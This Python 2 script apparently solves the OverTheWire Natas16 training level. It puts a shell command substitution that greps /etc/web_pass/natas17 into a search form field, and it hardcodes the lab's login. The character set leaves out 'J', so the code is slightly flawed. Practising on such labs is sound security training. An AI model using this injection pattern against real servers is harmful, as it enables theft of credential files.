import requests

url="http://natas16.natas.labs.overthewire.org/"
user = 'natas16'
passw = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
brute = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIKLMNOPQRSTUVWXYZ0123456789'
for ch in brute :
	data = {"needle":'$(grep '+ch+' /etc/web_pass/natas17)',
			"submit":"Search"}

	r = requests.post(url, data, auth=(user, passw))
	content = r.text
	print ch
	if('nice' not in r.text):
		break
print content		